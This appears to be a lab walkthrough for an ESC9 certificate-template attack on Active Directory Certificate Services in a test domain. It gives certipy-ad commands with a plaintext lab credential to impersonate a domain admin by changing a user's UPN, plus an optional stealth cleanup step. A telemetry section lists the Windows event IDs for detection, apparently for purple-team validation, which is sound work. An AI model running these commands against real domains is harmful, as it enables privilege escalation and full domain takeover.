# WT#057 — ESC9: No Security Extension

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | dc01 (192.168.77.10) |
| **Domain** | cadre.local |
| **CA** | cadre-CA |
| **Template** | CADRE-ESC9 |
| **Starting Credential** | analyst_dfir / An@lyst_DF1R! |
| **Tools Required** | certipy-ad |
| **Certifications** | ADCS |
| **MITRE ATT&CK** | T1649 |
| **Difficulty** | Hard |

## Prerequisites
- CA service running on dc01
- `CADRE-ESC9` template published, lacking `szOID_NTDS_CA_SECURITY_EXT` (1.3.6.1.4.1.311.25.2)
- `analyst_dfir` has Enroll on `CADRE-ESC9`
- Weak certificate mapping for Smartcard logon (GenericWrite or sufficient rights to modify UPN)

## Attack Steps

### 1. Enumerate ESC9 template
```powershell
certipy-ad find -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -target 192.168.77.10 -vuln -enabled
```

### 2. Enroll certificate as analyst_dfir
```powershell
certipy-ad req -ca cadre-CA -template CADRE-ESC9 -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -target 192.168.77.10
```

### 3. Modify own UPN to chief_command's UPN
```powershell
certipy-ad account update -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -user analyst_dfir -upn chief_command@cadre.local -target 192.168.77.10
```

### 4. Authenticate as chief_command using the certificate
```powershell
certipy-ad auth -pfx analyst_dfir.pfx -dc-ip 192.168.77.10 -domain cadre.local
```

### 5. Restore original UPN (optional, for stealth)
```powershell
certipy-ad account update -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -user analyst_dfir -upn analyst_dfir@cadre.local -target 192.168.77.10
```

## Post-Exploitation Chain
ESC9 → UPN modification → Authentication as DA → DCSync (WT#009) → Full domain compromise (cadre.local)

## Telemetry Verification
- **Event 4887**: CADRE-ESC9 enrollment by analyst_dfir
- **Event 5136**: `userPrincipalName` attribute modification on analyst_dfir
- **Event 4624**: Logon with certificate (Smartcard logon type)
- **Event 4768**: Kerberos TGT requested with alternate identity
## Status
CONFIGURED — CA cadre-CA running, ESC9 NO_SECURITY_EXTENSION flag verified
